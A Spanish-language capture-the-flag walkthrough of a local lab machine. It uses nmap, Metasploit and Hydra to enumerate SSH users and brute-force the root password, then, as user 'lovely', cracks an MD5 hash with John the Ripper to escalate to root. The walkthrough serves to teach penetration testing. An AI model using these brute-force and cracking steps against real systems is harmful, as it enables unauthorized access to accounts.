
![](img/Pasted%20image%2020241231173535.png#center)




## **Enumeración**

#### Escaneo de puertos

Realizamos un escaneo de puertos básico con **nmap** para identificar los puertos que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

![](img/Pasted%20image%2020241231173623.png#center)


**Resultados del escaneo:**

| Puerto | Estado | Servicio |     |
| ------ | ------ | -------- | --- |
| 22/tcp | open   | ssh      |     |

Realizamos un segundo escaneo a los puertos abiertos, lanzando una serie de script por defecto de `nmap` y reconocimiento de servicios.
```
nmap -p22 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```

![](img/Pasted%20image%2020241231173723.png#center)


| Puerto | Estado | Servicio | Versión                    |
| ------ | ------ | -------- | -------------------------- |
| 22/tcp | open   | ssh      | OpenSSH 7.7 (protocol 2.0) |

---


<h3><center> Análisis SSH (puerto 22)</center></h3>

Para enumerar bien el servicio `ftp`, siempre es aconsejable lanzar algunos script que tiene nmap por defecto, para localizar cuales son esos script, podemos ejecutar el comando.
```
locate .nse | grep "ssh"
```

![](img/Pasted%20image%2020250101101446.png#center)
###### **Explicación de los scripts:**
- **ssh-auth-methods.nse:** Este script se utiliza para detectar los métodos de autenticación que un servidor SSH admite. Es útil para identificar si un servidor permite autenticación por contraseña, claves públicas o ambos.
- **ssh-brute.nse:** Este script realiza un ataque de fuerza bruta contra un servidor SSH. Intenta adivinar las contraseñas de los usuarios utilizando una lista de contraseñas.
- **ssh-hostkey.nse:** Este script se utiliza para enumerar las claves públicas SSH de un servidor. Estas claves se utilizan para autenticar la identidad del servidor.
- **ssh-publickey-acceptance.nse:** Este script verifica si un servidor SSH acepta conexiones utilizando claves públicas.
- **ssh-run.nse:** Este script permite ejecutar comandos remotos en un servidor SSH. Es similar a ejecutar comandos a través de la línea de comandos de SSH, pero se hace utilizando Nmap.
- **ssh2-enum-algos.nse:** Este script enumera los algoritmos criptográficos soportados por un servidor SSH versión 2.
- **sshv1.nse:** Este script verifica si un servidor SSH admite la versión 1 del protocolo SSH.


---

## Explotación

#### METASPLOIT

Vamos a realizar la enumeración con `metasploit`. Así que iniciamos `metasploit`
```
msfconsole
```

![](img/Pasted%20image%2020241231173916.png#center)



<h5><center> Enumeración de Usuarios</center></h5>

Vamos a utilizar un módulo de `metasploit` para enumerar los posibles usuarios del sistema
```
use auxiliary/scanner/ssh/ssh_enumusers
```

![](img/Pasted%20image%2020241231174326.png#center)


Mostramos las opciones
```
show options
```

![](img/Pasted%20image%2020241231174356.png#center)

Configuramos las opciones
```
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```

![](img/Pasted%20image%2020241231175007.png#center)


Ejecutamos el módulo
```
run
```

![](img/Pasted%20image%2020241231175027.png#center)


<h5><center> Fuerza Bruta</center></h5>

Como tenemos un listado de los posibles usuarios, y sobre todo tenemos al usuario `root`, podemos realizar o averiguar por medio de fuerza bruta la contraseña para el usuario `root`. Incluso podemos crear un diccionario con todos los posibles usuarios enumerados y buscar las contraseña.
```
use auxiliary/scanner/ssh/ssh_login
```

![](img/Pasted%20image%2020241231175441.png#center)


Mostramos las opciones
```
show options
```

![](img/Pasted%20image%2020241231175518.png#center)


Configuramos las opciones
```
set RHOST 172.17.0.2
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

![](img/Pasted%20image%2020241231175652.png#center)


Ejecutamos el módulo
```
run
```

![](img/Pasted%20image%2020241231181259.png#center)

Me encuentra la contraseña del usuario `root:estrella`


Iniciamos sesión en el protocolo `SSH` con dichas credendiales
```
ssh root@172.17.0.2    # Después introducimos la contraseña estrella
```

![](img/Pasted%20image%2020241231181435.png#center)

---


#### HYDRA

También podemos realizar la fuerza bruta con HYDRA sin conocer ningún usuario ni contraseña
```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 172.17.0.2 -t 4 ssh
```

![](img/Pasted%20image%2020241231184343.png#center)

Ya solo queda iniciar sesión con el protocolo `SSH`.
```
ssh root@172.17.0.2       # Después ponemos la contraseña estrella
```

![](img/Pasted%20image%2020241231184458.png#center)



---


## Si no eres ROOT

En esta máquina puede ser que según el diccionario que utilices, puede que no te salga el usuario `root`,  y si otro usuario,aunque en un sistema Linux siempre tiene que haber un usuario `root`.

Por ejemplo, en el módulo de `metasploit`, para enumerar usuario vamos a usar otro diccionario.

Con `metasploit` ya iniciado, buscamos el módulo.
```
scanner/ssh/ssh_enumusers
```

![](img/Pasted%20image%2020241231185109.png#center)


Mostramos las opciones
```
show options
```

![](img/Pasted%20image%2020241231185139.png#center)


Configuramos las opciones
```
set RHOSTS 172.17.0.2
set USER_FILE /usr/share/wordlists/rockyou.txt
```

![](img/Pasted%20image%2020241231185907.png#center)


Ejecutamos el módulo
```
run
```

![](img/Pasted%20image%2020241231185953.png#center)



Nos encuentra solo un usuario `lovely`, podemos hacer fuerza bruta con `HYDRA` o con el módulo de `metasploit` como `ssh_login`. Hacemos fuerza bruta con `HYDRA`, ya que el del módulo ya lo tenemos mas arriba de como se hace. Y así repasamos como podemos hacer fuerza bruta con `hydra` conociendo un  usuario
```
hydra -l lovely -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 172.17.0.2 -t 4 ssh
```

![](img/Pasted%20image%2020250101092810.png#center)

Entramos en el protocolo `SSH` con las credenciales.
```
ssh lovely@172.17.0.2
```

![](img/Pasted%20image%2020250101092908.png#center)


Hacemos enumeración para realizar una escalada de privilegios. Primero vemos los binarios que el usuario `lovely` puede ejecutar con los permisos de usuario `root`.
```
sudo -l
```

![](img/Pasted%20image%2020250101093107.png#center)

No tenemos en esta máquina instalado `sudo`, por lo que seguimos enumerando para escalar privilegios. Buscamos los binarios que tienen permiso `SUID`.
```
find / -perm -4000 2>/dev/null
```

![](img/Pasted%20image%2020250101093315.png#center)

No vemos ninguno interesante. Nos toca enumerar el sistema buscando algún directorios o fichero que nos indique, algo. Haciendo la enumeración del sistema en la carpeta `/opt`, encontramos un fichero interesante, llamado `.hash`. Leemos el contenido
```
cat /opt/.hash
```

![](img/Pasted%20image%2020250101093518.png#center)

Es un hash en formato `MD5`. Procedemos a crakearlo con la herramienta `johntheripper`. Para ello, en nuestra máquina atacante, creamos un fichero llamado por ejemplo `hash-md5.txt` y pegamos el `hash`.
```
nano hash-md5.txt
```

![](img/Pasted%20image%2020250101093928.png#center)
![](img/Pasted%20image%2020250101094003.png#center)

Y ahora con `johntheripper` ejecutamos el siguiente código
```
john --format=md5 --wordlist=/usr/share/wordlists/metasploit/unix_passwords.txt hash-md5.txt
```

![](img/Pasted%20image%2020250101094424.png#center)

Da el siguiente error, `Unknown ciphertext format name requested`, esto indica que `John the Ripper `no reconoce el formato del hash que estás intentando crackear. Para solucionar este error, debemos cambiar a  `--format=raw-md5` en lugar de `--format=md5`. Esto puede ser necesario en algunos casos, especialmente si el hash no tiene un formato estándar.
```
john --format=raw-md5 --wordlist=/usr/share/wordlists/metasploit/unix_passwords.txt hash-md5.txt
```

![](img/Pasted%20image%2020250101094638.png#center)


Pudimos obtener finalmente una credencial, que parece ser una contraseña. Probamos esta contraseña con el usuario `root`.
```
su root      # Después ponemos la contraseña "estrella"
```

![](img/Pasted%20image%2020250101094833.png#center)

Pudimos elevar los privilegios al usuario `root`.


